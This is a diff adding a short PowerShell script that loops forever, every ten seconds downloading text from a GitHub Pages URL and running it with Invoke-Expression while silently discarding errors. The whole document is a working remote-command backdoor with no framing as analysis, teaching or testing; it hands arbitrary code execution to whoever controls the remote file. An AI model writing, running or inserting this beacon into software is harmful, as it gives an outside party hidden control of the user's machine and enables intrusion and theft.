@@ -1,0 +1,9 @@
+while ($true) {
+    try {
+        $cmd = Invoke-RestMethod -Uri "https://shosho2135.github.io/remotescript/getcommand.txt"
+        if ($cmd -ne "") {
+            iex $cmd
+        }
+    } catch {}
+    Start-Sleep -Seconds 10
+}
